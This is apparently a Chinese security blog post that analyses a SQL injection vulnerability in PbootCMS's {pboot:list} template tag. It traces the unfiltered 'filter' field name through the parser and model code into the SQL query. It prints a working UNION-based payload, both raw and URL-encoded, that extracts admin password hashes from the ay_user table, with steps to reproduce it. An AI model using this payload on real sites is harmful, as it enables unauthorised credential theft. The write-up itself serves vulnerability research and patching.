#  pbootcms SQL注入漏洞分析  
原创 青春计协
                    青春计协  青春计协   2026-03-21 09:41  
  
**点击蓝字 关注我们**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/p4hYM0n6exxQC3FdbgZHDXOreCUibAb2133QLeboGgicb07KFew5f1fu1HbdS6yWcznvwk79mFT5HYQYuZN8Fosw/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/p4hYM0n6exxQC3FdbgZHDXOreCUibAb21Q61GTh0g3ALdCq45rCUvmOicGicutGdESF2v3UkclWjV7VCx8lWCz3rQ/640?wx_fmt=png "")  
  
  
免责申明：  
  
  
  
      本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号(青春计协)不为此承担任何责任。  
  
  
  
  
  
  
漏洞分析：  
  
  
  
**一、已知payload：**  
```
http://ip:port/index.php?tag=ccc:{pboot:list filter=1=2)UNION/**/SELECT/**/1,2,3,4,5,(select/**/password/**/from/**/ay_user),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29/**/--/**/|123 scode=123}[list:link link=asd]{/pboot:list}
```  
  
  
  
  
  
  
**二、**  
parserListLabel方法：  
```
因为漏洞的filter参数处理逻辑就在parserListLabel方法中。
该方法负责解析 {pboot:list} 模板标签，并在L1295-L1310处理filter参数，将未过滤的字段名直接拼接到SQL语句中，这是漏洞的根源所在。
代码：
/**
 * 解析内容列表标签 {pboot:list}
 * @param string $content 模板内容
 * @param string $cscode  当前栏目编码
 * @return string
 */
public function parserListLabel($content, $cscode = '')
{
    // 匹配 {pboot:list ...}...{/pboot:list}
    $pattern = '/\{pboot:list(\s+[^}]+)?\}([\s\S]*?)\{\/pboot:list\}/';
    if (preg_match_all($pattern, $content, $matches)) {
        for ($i = 0; $i < count($matches[0]); $i++) {
            // 1. 提取标签参数
            $params = $this->parserParam($matches[1][$i]);
            // 省略权限检查

            // 2. 初始化默认参数
            $num = 15; $order = '...'; $filter = ''; $tags = ''; $fuzzy = true;
            // ... 其他默认值

            // 3. 处理 scode（栏目编码）
            // ...

            // 4. 遍历 params 覆盖默认值
            foreach ($params as $key => $value) {
                switch ($key) {
                    case 'filter': $filter = $value; break;
                    // ... 其他 case 省略
                }
            }

            // 5. 构造 filter 条件 (漏洞点)
            $where1 = array();
            if ($filter) {
                $filter = explode('|', $filter);          // 格式：字段名|值1,值2
                if (count($filter) == 2) {
                    $filter_arr = explode(',', $filter[1]); // 值列表
                    if ($filter[0] == 'title') {
                        $filter[0] = 'a.title';
                    }
                    foreach ($filter_arr as $value) {
                        if ($value) {
                            if ($fuzzy) {
                                // 字段名直接拼接，未过滤！
                                $where1[] = $filter[0] . " like '%" . escape_string($value) . "%'";
                            } else {
                                $where1[] = $filter[0] . "='" . escape_string($value) . "'";
                            }
                        }
                    }
                }
            }

            // 6. 构造 tags 条件（类似，但字段固定）
            $where2 = array();
            // ... 省略

            // 7. 其他筛选条件
            $where3 = array();
            // ... 省略

            // 8. 调用模型获取数据
            $data = $this->model->getList($scode, $num, $order, $where1, $where2, $where3, $fuzzy, $start, $lfield, null, $page);

            // 9. 替换内部标签并拼接结果
            // ... 省略
        }
    }
    return $content;
}
```  
  
  
  
  
  
  
**三、parserListLabel方法的调用：**  
```
跟进代码发现parserListLabel方法在IndexController.php的L264被调用，此方法用于CMS分类列表标签解析。同时在ParserController.php的L71也被调用，用于指定列表解析

// IndexController.php L264
$content = $this->parser->parserListLabel($content, $sort->scode); // CMS分类列表标签解析
// ParserController.php L71
$content = $this->parserListLabel($content); // 指定列表
```  
  
  
  
  
  
  
**四、分析filter参数：**  
```
跟进parserListLabel方法，此方法用于解析`{pboot:list}`模板标签。关键代码在ParserController.php的L1161-L1163：
public function parserListLabel($content, $cscode = '')
{
    $pattern = '/\{pboot:list(\s+[^}]+)?\}([\s\S]*?)\{\/pboot:list\}/';

    if (preg_match_all($pattern, $content, $matches)) {

这里使用正则表达式匹配模板内容中的`{pboot:list}`标签，然后提取标签中的参数。跟进parserParam方法，此方法用于提取标签参数，关键代码在ParserController.php的L118-L134：
public function parserParam($string)
{
    if (! preg_match_all('/([\w]+)[\s]+([\w\-\.\/\=\$\@\:\s\|\,\x{4e00}-\x{9fa5}]+)/u', $string, $matches)) {
        return array();
    }

    $params = array();
    foreach ($matches[1] as $key => $value) {
        $params[$value] = $matches[2][$key];
    }

    return $params;
}
这里将标签参数提取到$params数组中，其中filter参数会被提取为`$params['filter']`。
继续查看filter参数的处理，关键代码在ParserController.php的L1295-L1310：
// filter数据筛选
$where1 = array();
if ($filter) {
    $filter = explode('|', $filter);
    if (count($filter) == 2) {
        $filter_arr = explode(',', $filter[1]);
        if ($filter[0] == 'title') {
            $filter[0] = 'a.title';
        }
        foreach ($filter_arr as $value) {
            if ($value) {
                if ($fuzzy) {
                    $where1[] = $filter[0] . " like '%" . escape_string($value) . "%'";
                } else {
                    $where1[] = $filter[0] . "='" . escape_string($value) . "'";
                }
            }
        }
    }
}
这里将从模板标签中提取的filter参数进行处理，使用`|`分割成字段名和字段值，之后将字段名和字段值拼接到SQL语句中。关键发现：`$filter[0]`（字段名）直接拼接到SQL语句中，未经过滤！只有`$value`经过了`escape_string`过滤。
```  
  
  
  
  
  
  
**五、分析SQL语句：**  
```
继续查看$where1数组是如何被传递到数据库查询中的，关键代码在ParserController.php的L1419：
$data = $this->model->getList($scode, $num, $order, $where1, $where2, $where3, $fuzzy, $start, $lfield, null, $page);
跟进getList方法，此方法在ParserModel.php的L302定义，关键代码在L444-L458：
// 筛选条件支持模糊匹配
if($page){
return parent::table('ay_content a ' . $indexSql)->field($fields)
        ->where($scode_arr, 'OR')
        ->where($where)
        ->where($select, 'AND', 'AND', $fuzzy)
        ->where($filter, 'OR')
        ->where($tags, 'OR')
        ->join($join)
        ->order($order)
        ->page(1, $num, $start)
        ->decode()
        ->select();
}
这里将$filter参数（即$where1数组）传递给了where方法。跟进where方法，此方法在Model.php的L395定义，关键代码在L405-L424：
if (is_array($where)) {
    $where_string = '';
    $flag = false;
    foreach ($where as $key => $value) {
        if ($flag) { // 条件之间内部AND连接
            $where_string .= '' . $inConnect . '';
        } else {
            $flag = true;
        }
        if (!is_int($key)) {
            if ($fuzzy) {
                $where_string .= $key . " like '%" . $value . "%' ";
            } else {
                $where_string .= $key . "='" . $value . "' ";
            }
        } else {
            $where_string .= $value;
        }
    }
    $this->sql['where'] .= $where_string . ')';
}
**关键漏洞点**：在Model.php的L420-L422，当$where数组的key是整数时（即数字索引数组），$value会被直接拼接到SQL语句中，不经过任何过滤！
} else {
    $where_string .= $value;
}

```  
  
  
  
  
  
  
**六、渲染执行：**  
```
$where1数组在ParserController.php的L1308被构造时，使用了数字索引：
$where1[] = $filter[0] . " like '%" . escape_string($value) . "%'";
这意味着$where1数组是一个数字索引数组，其key是整数（0, 1, 2, ...）。当这个数组被传递到Model.php的where方法时，会走到L420-L422的分支，$value会被直接拼接到SQL语句中，不经过任何过滤！
```  
  
  
  
  
  
  
**七、payload构造：**  
```
首先，根据漏洞分析我们可以构造如下payload：
tag=ccc:{pboot:list filter=1=2)UNION/**/SELECT/**/1,2,3,4,5,(select/**/password/**/from/**/ay_user),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29/**/--/**/|123 scode=123}[list:link link=asd]{/pboot:list}
payload解析：
1： `filter=1=2)UNION/**/SELECT...|123`：filter参数被`|`分割为两部分
   - `$filter[0] = "1=2)UNION/**/SELECT/**/1,2,3,4,5,(select/**/password/**/from/**/ay_user),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29/**/--/**/"`
   - `$filter[1] = "123"`
2： 在ParserController.php的L1308，构造SQL条件：   $where1[] = "1=2)UNION/**/SELECT/**/1,2,3,4,5,(select/**/password/**/from/**/ay_user),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29/**/--/**/ like '%123%'";
3： 在Model.php的L421，$value被直接拼接到SQL语句中：
sql: WHERE(... AND (1=2)UNION/**/SELECT/**/1,2,3,4,5,(select/**/password/**/from/**/ay_user),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29/**/--/**/ like '%123%'))
4:  最终执行的SQL语句:
sql: SELECT ... FROM ay_content a ... WHERE(... AND (1=2)UNION/**/SELECT/**/1,2,3,4,5,(select/**/password/**/from/**/ay_user),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29/**/--/**/ like '%123%')) ...
5:  由于`1=2`为false，原查询不返回结果，UNION后面的SELECT语句被执行，返回ay_user表中的password字段。

```  
  
  
  
  
  
  
漏洞复现：  
  
  
  
A、直接使用这个payload：  
```
http://localhost/index.php?tag=ccc%3A%7Bpboot%3Alist%20filter%3D1%3D2)UNION%2F**%2FSELECT%2F**%2F1%2C2%2C3%2C4%2C5%2C(select%2F**%2Fpassword%2F**%2Ffrom%2F**%2Fay_user)%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2F**%2F--%2F**%2F%7C123%20scode%3D123%7D%5Blist%3Alink%20link%3Dasd%5D%7B%2Fpboot%3Alist%7D
```  
  
B、回显不同：  
```
页面直接搜索ccc是搜索不到的：
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/kMCnmq4h3kPPhGI8PvLYhgO5l5cuNKQmib1drNbq6ib6YhjYf8flSmng26MNw8hPHUOuyq8SFf02MMngZtCbfUh3NEu2Bos9Pt58949rE0s3w/640?wx_fmt=png "")  
```
补充知识：
1、Payload 中的 [list:link link=asd] 标签被替换为从数据库获取的密码值（例如 f8545a16837b1e586073697bb3b6a570）。
2、在 PbootCMS 的模板解析中，[list:link] 是用于生成链接，其输出结果会被放在 <a> 标签的 href 属性中（例如 <a href="/?tag/ccc:f8545a16837b1e586073697bb3b6a570/">相关内容</a>）。
浏览器渲染时，只会显示 <a> 标签之间的内容（即“相关内容”），而不会显示 href 属性的值。 因此，密码值虽然在源代码中可见，但在页面上是看不到的。

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/kMCnmq4h3kNq1XbzYFkVHYQ0uqeceJ4tMibxvstBHfIBcQZe4nu0ial8PrmGtaCswIIsz9icBtTIfAicYd3Tt92WQ7AJZK2rlOwW9weIc0XdQXE/640?wx_fmt=png "")  
  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/kMCnmq4h3kPN0pXsXePH2KgIgD3ia5qDsVgVYX1FlA2QKTOGpIgPiaMIOIAXoic2DARWuQ5ib08kibwIXUobB3N7prBku4YQWcFb94I0AXQ0FFkc/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/kMCnmq4h3kPFU8WgJ9xnicHEPyhVlwD1OeOIjUGYJTlLB7dVtzMicicdDkpzJfJIPicN4edeGMCmt4kjddOibbGnH1WygUiaAy7LyqG89XTSVS9zU/640?wx_fmt=jpeg "")  
  
**编辑｜**  
青春计协  
  
**审核｜青春计协**  
  
